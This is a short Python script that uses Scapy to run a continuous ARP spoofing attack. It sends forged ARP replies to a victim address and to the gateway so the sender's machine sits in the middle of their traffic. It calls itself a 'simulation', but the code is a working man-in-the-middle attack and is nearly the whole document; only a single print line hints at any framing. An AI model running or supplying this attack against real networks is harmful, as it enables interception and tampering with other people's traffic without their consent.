from scapy.all import ARP, send
import time

target_ip = "192.168.1.5"     # victim IP
gateway_ip = "192.168.1.1"    # router/gateway IP
attacker_mac = "your_attacker_mac_here"

print(" Starting ARP spoofing (MitM simulation)...")

def spoof(victim_ip, spoof_ip):
    packet = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

try:
    while True:
        spoof(target_ip, gateway_ip)  # Trick victim: gateway is at attacker's MAC
        spoof(gateway_ip, target_ip)  # Trick router: victim is at attacker's MAC
        time.sleep(2)
except KeyboardInterrupt:
    print(" ARP spoofing stopped.")
